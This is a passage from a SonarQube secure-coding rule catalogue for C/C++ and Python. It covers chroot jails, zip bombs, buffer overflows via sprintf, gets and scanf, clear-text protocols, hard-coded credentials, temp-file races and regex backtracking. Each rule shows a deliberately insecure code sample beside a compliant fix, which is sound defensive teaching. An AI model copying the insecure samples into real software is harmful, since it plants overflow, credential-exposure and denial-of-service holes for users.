chroot(root_dir); // Sensitive: no chdir before or after chroot, and missing check of return value
</pre>
<p>The <code>chroot</code> or <code>chdir</code> operations could fail and the process still have access to unauthorized resources. The return code
should be checked:</p>
<pre>
const char* root_dir &#61; &#34;/jail/&#34;;
chroot(root_dir); // Sensitive: missing check of the return value
const char* any_dir &#61; &#34;/any/&#34;;
chdir(any_dir); // Sensitive: missing check of the return value
</pre>
<h2>Compliant Solution</h2>
<p>To correctly isolate the application into a jail, change the current directory with <code>chdir</code> before the <code>chroot</code> and check the
return code of both functions:</p>
<pre>
const char* root_dir &#61; &#34;/jail/&#34;;

if (chdir(root_dir) &#61;&#61; -1) {
  exit(-1);
}

if (chroot(root_dir) &#61;&#61; -1) {  // compliant: the current dir is changed to the jail and the results of both functions are checked
  exit(-1);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> -
  Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/243" rel="nofollow">MITRE, CWE-243</a> - Creation of chroot Jail Without Changing Working Directory </li><li> <a href="https://man7.org/linux/man-pages/man2/chdir.2.html" rel="nofollow">man7.org</a> - chdir </li><li> <a href="https://man7.org/linux/man-pages/man2/chroot.2.html" rel="nofollow">man7.org</a> - chroot </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5042">
              cpp:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio" rel="nofollow">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul><li> There is no validation of the number of entries in the archive. </li><li> There is no validation of the total size of the uncompressed data. </li><li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Define and control the threshold for maximum total size of the uncompressed data. </li><li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;archive.h&gt;
#include &lt;archive_entry.h&gt;
// ...

void f(const char *filename, int flags) {
  struct archive_entry *entry;
  struct archive *a &#61; archive_read_new();
  struct archive *ext &#61; archive_write_disk_new();
  archive_write_disk_set_options(ext, flags);
  archive_read_support_format_tar(a);

  if ((archive_read_open_filename(a, filename, 10240))) {
    return;
  }

  for (;;) {
    int r &#61; archive_read_next_header(a, &amp;entry);
    if (r &#61;&#61; ARCHIVE_EOF) {
      break;
    }
    if (r !&#61; ARCHIVE_OK) {
      return;
    }
  }
  archive_read_close(a);
  archive_read_free(a);

  archive_write_close(ext);
  archive_write_free(ext);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;archive.h&gt;
#include &lt;archive_entry.h&gt;
// ...

int f(const char *filename, int flags) {
  const int max_number_of_extraced_entries &#61; 1000;
  const int64_t max_file_size &#61; 1000000000; // 1 GB

  int number_of_extraced_entries &#61; 0;
  int64_t total_file_size &#61; 0;

  struct archive_entry *entry;
  struct archive *a &#61; archive_read_new();
  struct archive *ext &#61; archive_write_disk_new();
  archive_write_disk_set_options(ext, flags);
  archive_read_support_format_tar(a);
  int status &#61; 0;

  if ((archive_read_open_filename(a, filename, 10240))) {
    return -1;
  }

  for (;;) {
    number_of_extraced_entries&#43;&#43;;
    if (number_of_extraced_entries &gt; max_number_of_extraced_entries) {
      status &#61; 1;
      break;
    }

    int r &#61; archive_read_next_header(a, &amp;entry);
    if (r &#61;&#61; ARCHIVE_EOF) {
      break;
    }
    if (r !&#61; ARCHIVE_OK) {
      status &#61; -1;
      break;
    }

    int file_size &#61; archive_entry_size(entry);
    total_file_size &#43;&#61; file_size;
    if (total_file_size &gt; max_file_size) {
      status &#61; 1;
      break;
    }
  }
  archive_read_close(a);
  archive_read_free(a);

  archive_write_close(ext);
  archive_write_free(ext);

  return status;
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> -
  Security Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/409" rel="nofollow">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)
  </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.&#43;Safely&#43;extract&#43;files&#43;from&#43;ZipInputStream" rel="nofollow">CERT, IDS04-J.</a> - Safely
  extract files from ZipInputStream </li><li> <a href="https://www.bamsoftware.com/hacks/zipbomb/" rel="nofollow">bamsoftware.com</a> - A better Zip Bomb </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S6069">
              cpp:S6069
            </a>
          </td>
          <td>
            <details>
              <p>When using <code>sprintf</code> , it’s up to the developer to make sure the size of the buffer to be written to is large enough to avoid buffer
overflows. Buffer overflows can cause the program to crash at a minimum. At worst, a carefully crafted overflow can cause malicious code to be
executed.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> if the provided buffer is large enough for the result of any possible call to the <code>sprintf</code> function (including all possible format
  strings and all possible additional arguments). </li></ul>
<p>There is a risk if you answered no to the above question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>There are fundamentally safer alternatives. <code>snprintf</code> is one of them. It takes the size of the buffer as an additional argument,
preventing the function from overflowing the buffer.</p>
<ul><li> Use <code>snprintf</code> instead of <code>sprintf</code>. The slight performance overhead can be afforded in a vast majority of projects.
  </li><li> Check the buffer size passed to <code>snprintf</code>. </li></ul>
<p>If you are working in C&#43;&#43;, other safe alternative exist:</p>
<ul><li> <code>std::string</code> should be the prefered type to store strings </li><li> You can format to a string using <code>std::ostringstream</code> </li><li> Since C&#43;&#43;20, <code>std::format</code> is also available to format strings </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
sprintf(str, &#34;%s&#34;, message);   // Sensitive: &#96;str&#96; buffer size is not checked and it is vulnerable to overflows
</pre>
<h2>Compliant Solution</h2>
<pre>
snprintf(str, sizeof(str), &#34;%s&#34;, message); // Prevent overflows by enforcing a maximum size for &#96;str&#96; buffer
</pre>
<h2>Exceptions</h2>
<p>It is a very common and acceptable pattern to compute the required size of the buffer with a call to <code>snprintf</code> with the same arguments
into an empty buffer (this will fail, but return the necessary size), then to call <code>sprintf</code> as the bound check is not needed anymore. Note
that 1 needs to be added by the size reported by <code>snprintf</code> to account for the terminal null character.</p>
<pre>
size_t buflen &#61; snprintf(0, 0, &#34;%s&#34;, message);
char* buf &#61; malloc(buflen &#43; 1); // For the final 0
sprintf(buf, &#34;%s&#34;, message);{code}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" rel="nofollow">OWASP Top 10 2021 Category A6</a> - Vulnerable and Outdated
  Components </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category
  A9</a> - Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/676" rel="nofollow">MITRE, CWE-676</a> - Use of Potentially Dangerous Function </li><li> <a href="https://cwe.mitre.org/data/definitions/119" rel="nofollow">MITRE, CWE-119</a> - Improper Restriction of Operations within the Bounds of a Memory
  Buffer </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5332">
              cpp:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul><li> sensitive data exposure </li><li> traffic redirected to a malicious endpoint </li><li> malware-infected software update or installer </li><li> execution of client-side code </li><li> corruption of critical information </li></ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul><li> bypassing isolation mechanisms </li><li> compromising a component of the network </li><li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li></ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http" rel="nofollow">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169" rel="nofollow">CVE-2019-6169</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327" rel="nofollow">CVE-2019-12327</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065" rel="nofollow">CVE-2019-11065</a> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li><li> Application data transits over an untrusted network. </li><li> Compliance rules require the service to encrypt data in transit. </li><li> Your application renders web pages with a relaxed mixed content policy. </li><li> OS-level protections against clear-text traffic are deactivated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul><li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li><li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li><li> Use <code>https</code> instead of <code>http</code>. </li><li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li></ul>  </li><li> Enable encryption of cloud components communications whenever it is possible. </li><li> Configure your application to block mixed content when rendering web pages. </li><li> If available, enforce OS-level deactivation of all clear-text traffic. </li></ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
char* http_url &#61; &#34;http://example.com&#34;; // Sensitive
char* ftp_url &#61; &#34;ftp://anonymous&#64;example.com&#34;; // Sensitive
char* telnet_url &#61; &#34;telnet://anonymous&#64;example.com&#34;; // Sensitive
</pre>
<pre>
#include &lt;curl/curl.h&gt;

CURL *curl_ftp &#61; curl_easy_init();
curl_easy_setopt(curl_ftp, CURLOPT_URL, &#34;ftp://example.com/&#34;); // Sensitive

CURL *curl_smtp &#61; curl_easy_init();
curl_easy_setopt(curl_smtp, CURLOPT_URL, &#34;smtp://example.com:587&#34;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
char* https_url &#61; &#34;https://example.com&#34;;
char* sftp_url &#61; &#34;sftp://anonymous&#64;example.com&#34;;
char* ssh_url &#61; &#34;ssh://anonymous&#64;example.com&#34;;
</pre>
<pre>
#include &lt;curl/curl.h&gt;

CURL *curl_ftps &#61; curl_easy_init();
curl_easy_setopt(curl_ftps, CURLOPT_URL, &#34;ftp://example.com/&#34;);
curl_easy_setopt(curl_ftps, CURLOPT_USE_SSL, CURLUSESSL_ALL); // FTP transport is done over TLS

CURL *curl_smtp_tls &#61; curl_easy_init();
curl_easy_setopt(curl_smtp_tls, CURLOPT_URL, &#34;smtp://example.com:587&#34;);
curl_easy_setopt(curl_smtp_tls, CURLOPT_USE_SSL, CURLUSESSL_ALL); // SMTP with STARTTLS
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html" rel="nofollow">Google, Moving towards more secure web</a> </li><li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/" rel="nofollow">Mozilla, Deprecating non secure http</a> </li><li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html" rel="nofollow">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li><li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html" rel="nofollow">AWS
  Documentation</a> - Stream Encryption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S2068">
              cpp:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule looks for hard-coded credentials in variable names that match any of the patterns from the provided list.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li><li> Credentials are used in production environments. </li><li> Application re-distribution is required before updating the credentials. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
dbi_conn conn &#61; dbi_conn_new(&#34;mysql&#34;);
string password &#61; &#34;secret&#34;; // Sensitive
dbi_conn_set_option(conn, &#34;password&#34;, password.c_str());
</pre>
<h2>Compliant Solution</h2>
<pre>
dbi_conn conn &#61; dbi_conn_new(&#34;mysql&#34;);
string password &#61; getDatabasePassword(); // Compliant
dbi_conn_set_option(conn, &#34;password&#34;, password.c_str()); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/OjdGBQ" rel="nofollow">CERT, MSC03-J.</a> - Never hard code sensitive information </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5798">
              cpp:S5798
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>The compiler is generally allowed to remove code that does not have any effect, according to the abstract machine of the C language. This means
that if you have a buffer that contains sensitive data (for instance passwords), calling <code>memset</code> on the buffer before releasing the memory
will probably be optimized away.</p>
<p>The function <a href="https://en.cppreference.com/w/c/string/byte/memset" rel="nofollow"><code>memset_s</code></a> behaves similarly to <code>memset</code>, but
the main difference is that it cannot be optimized away, the memory will be overwritten in all cases. You should always use this function to scrub
security-sensitive data.</p>
<p>This rule raises an issue when a call to <code>memset</code> is followed by the destruction of the buffer.</p>
<p>Note that <code>memset_s</code> is defined in annex K of C11, so to have access to it, you need a standard library that supports it (this can be
tested with the macro <code>__STDC_LIB_EXT1__</code>), and you need to enable it by defining the macro <code>__STDC_WANT_LIB_EXT1__</code> before
including <code>&lt;string.h&gt;</code>. Other platform specific functions can perform the same operation, for instance <a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877%28v&#61;vs.85%29?redirectedfrom&#61;MSDN" rel="nofollow">SecureZeroMemory</a> (Windows)
or <a href="https://www.freebsd.org/cgi/man.cgi?query&#61;explicit_bzero" rel="nofollow">explicit_bzero</a> (FreeBSD)</p>
<h3>Noncompliant code example</h3>
<pre>
void f(char *password, size_t bufferSize) {
  char localToken[256];
  init(localToken, password);
  memset(password, &#39; &#39;, strlen(password)); // Noncompliant, password is about to be freed
  memset(localToken, &#39; &#39;, strlen(localToken)); // Noncompliant, localToken is about to go out of scope
  free(password);
}
</pre>
<h3>Compliant solution</h3>
<pre>
void f(char *password, size_t bufferSize) {
  char localToken[256];
  init(localToken, password);
  memset_s(password, bufferSize, &#39; &#39;, strlen(password));
  memset_s(localToken, sizeof(localToken), &#39; &#39;, strlen(localToken));
  free(password);
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/14" rel="nofollow">MITRE, CWE-14</a> - Compiler Removal of Code to Clear Buffers </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S1079">
              cpp:S1079
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>The <code>%s</code> placeholder is used to read a word into a string.</p>
<p>By default, there is no restriction on the length of that word, and the developer is required to pass a sufficiently large buffer for storing
it.</p>
<p>No matter how large the buffer is, there will always be a longer word.</p>
<p>Therefore, programs relying on <code>%s</code> are vulnerable to buffer overflows.</p>
<p>A field width specifier can be used together with the <code>%s</code> placeholder to limit the number of bytes which will by written to the
buffer.</p>
<p>Note that an additional byte is required to store the null terminator.</p>
<h3>Noncompliant code example</h3>
<pre>
char buffer[10];
scanf(&#34;%s&#34;, buffer);      // Noncompliant - will overflow when a word longer than 9 characters is entered
</pre>
<h3>Compliant solution</h3>
<pre>
char buffer[10];
scanf(&#34;%9s&#34;, buffer);     // Compliant - will not overflow
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/120" rel="nofollow">MITRE, CWE-120</a> - Buffer Copy without Checking Size of Input (&#39;Classic Buffer
  Overflow&#39;) </li><li> <a href="https://cwe.mitre.org/data/definitions/676" rel="nofollow">MITRE, CWE-676</a> - Use of Potentially Dangerous Function </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5443">
              cpp:S5443
            </a>
          </td>
          <td>
            <details>
              <p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451" rel="nofollow">CVE-2012-2451</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838" rel="nofollow">CVE-2015-1838</a> </li></ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>
<ul><li> <code>/tmp</code> </li><li> <code>/var/tmp</code> </li><li> <code>/usr/tmp</code> </li><li> <code>/dev/shm</code> </li><li> <code>/dev/mqueue</code> </li><li> <code>/run/lock</code> </li><li> <code>/var/run/lock</code> </li><li> <code>/Library/Caches</code> </li><li> <code>/Users/Shared</code> </li><li> <code>/private/tmp</code> </li><li> <code>/private/var/tmp</code> </li><li> <code>\Windows\Temp</code> </li><li> <code>\Temp</code> </li><li> <code>\TMP</code> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Files are read from or written into a publicly writable folder </li><li> The application creates files with predictable names into a publicly writable folder </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use a dedicated sub-folder with tightly controlled permissions </li><li> Use secure-by-design APIs to create temporary files. Such API will make sure:
    <ul><li> The generated filename is unpredictable </li><li> The file is readable and writable only by the creating user ID </li><li> The file descriptor is not inherited by child processes </li><li> The file will be destroyed as soon as it is closed </li></ul>  </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;cstdio&gt;
// ...

void f() {
  FILE * fp &#61; fopen(&#34;/tmp/temporary_file&#34;, &#34;r&#34;); // Sensitive
}
</pre>
<pre>
#include &lt;cstdio&gt;
#include &lt;cstdlib&gt;
#include &lt;sstream&gt;
// ...

void f() {
  std::stringstream ss;
  ss &lt;&lt; getenv(&#34;TMPDIR&#34;) &lt;&lt; &#34;/temporary_file&#34;; // Sensitive
  FILE * fp &#61; fopen(ss.str().c_str(), &#34;w&#34;);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;cstdio&gt;
#include &lt;cstdlib&gt;
// ...

void f() {
  FILE * fp &#61; tmpfile(); // Compliant
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/377" rel="nofollow">MITRE, CWE-377</a> - Insecure Temporary File </li><li> <a href="https://cwe.mitre.org/data/definitions/379" rel="nofollow">MITRE, CWE-379</a> - Creation of Temporary File in Directory with Incorrect Permissions
  </li><li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File" rel="nofollow">OWASP, Insecure Temporary File</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S1081">
              cpp:S1081
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>When using typical C functions, it’s up to the developer to make sure the size of the buffer to be written to is large enough to avoid buffer
overflows. Buffer overflows can cause the program to crash at a minimum. At worst, a carefully crafted overflow can cause malicious code to be
executed.</p>
<p>This rule reports use of the following insecure functions, for which knowing the required size is not generally possible: <code>gets()</code> and
<code>getpw()</code>.</p>
<p>In such cases. The only way to prevent buffer overflow while using these functions would be to control the execution context of the
application.</p>
<p>It is much safer to secure the application from within and to use an alternate, secure function which allows you to define the maximum number of
characters to be written to the buffer:</p>
<ul><li> <code>fgets</code> or <code>gets_s</code> </li><li> <code>getpwuid</code> </li></ul>
<h3>Noncompliant code example</h3>
<pre>
gets(str); // Noncompliant; &#96;str&#96; buffer size is not checked and it is vulnerable to overflows
</pre>
<h3>Compliant solution</h3>
<pre>
gets_s(str, sizeof(str)); // Prevent overflows by enforcing a maximum size for &#96;str&#96; buffer
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/676" rel="nofollow">MITRE, CWE-676</a> - Use of Potentially Dangerous Function </li><li> <a href="https://cwe.mitre.org/data/definitions/119" rel="nofollow">MITRE, CWE-119</a> - Improper Restriction of Operations within the Bounds of a Memory
  Buffer </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5852">
              python:S5852
            </a>
          </td>
          <td>
            <details>
              <p>Most of the regular expression engines use <code>backtracking</code> to try all possible execution paths of the regular expression when evaluating
an input, in some cases it can cause performance issues, called <code>catastrophic backtracking</code> situations. In the worst case, the complexity
of the regular expression is exponential in the size of the input, this means that a small carefully-crafted input (like 20 chars) can trigger
<code>catastrophic backtracking</code> and cause a denial of service of the application. Super-linear regex complexity can lead to the same impact too
with, in this case, a large carefully-crafted input (thousands chars).</p>
<p>This rule determines the runtime complexity of a regular expression and informs you of the complexity if it is not linear.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The input is user-controlled. </li><li> The input size is not restricted to a small number of characters. </li><li> There is no timeout in place to limit the regex evaluation time. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To avoid <code>catastrophic backtracking</code> situations, make sure that none of the following conditions apply to your regular expression.</p>
<p>In all of the following cases, catastrophic backtracking can only happen if the problematic part of the regex is followed by a pattern that can
fail, causing the backtracking to actually happen. Note that when performing a full match (e.g. using <code>re.fullmatch</code>), the end of the regex
counts as a pattern that can fail because it will only succeed when the end of the string is reached.</p>
<ul><li> If you have a non-possessive repetition <code>r*</code> or <code>r*?</code>, such that the regex <code>r</code> could produce different
  possible matches (of possibly different lengths) on the same input, the worst case matching time can be exponential. This can be the case if
  <code>r</code> contains optional parts, alternations or additional repetitions (but not if the repetition is written in such a way that there’s only
  one way to match it). </li><li> If you have multiple non-possessive repetitions that can match the same contents and are consecutive or are only separated by an optional
  separator or a separator that can be matched by both of the repetitions, the worst case matching time can be polynomial (O(n^c) where c is the
  number of problematic repetitions). For example <code>a*b*</code> is not a problem because <code>a*</code> and <code>b*</code> match different
  things and <code>a*_a*</code> is not a problem because the repetitions are separated by a <code>&#39;_&#39;</code> and can’t match that <code>&#39;_&#39;</code>.
  However, <code>a*a*</code> and <code>.*_.*</code> have quadratic runtime. </li><li> If you’re performing a partial match (such as by using <code>re.search</code>, <code>re.split</code>, <code>re.findall</code> etc.) and the
  regex is not anchored to the beginning of the string, quadratic runtime is especially hard to avoid because whenever a match fails, the regex engine
  will try again starting at the next index. This means that any unbounded repetition (even a possessive one), if it’s followed by a pattern that can
  fail, can cause quadratic runtime on some inputs. For example <code>re.split(r&#34;\s*,&#34;, my_str)</code> will run in quadratic time on strings that
  consist entirely of spaces (or at least contain large sequences of spaces, not followed by a comma). </li></ul>
<p>In order to rewrite your regular expression without these patterns, consider the following strategies:</p>
<ul><li> If applicable, define a maximum number of expected repetitions using the bounded quantifiers, like <code>{1,5}</code> instead of <code>&#43;</code>
  for instance. </li><li> Refactor <code>nested quantifiers</code> to limit the number of way the inner group can be matched by the outer quantifier, for instance this
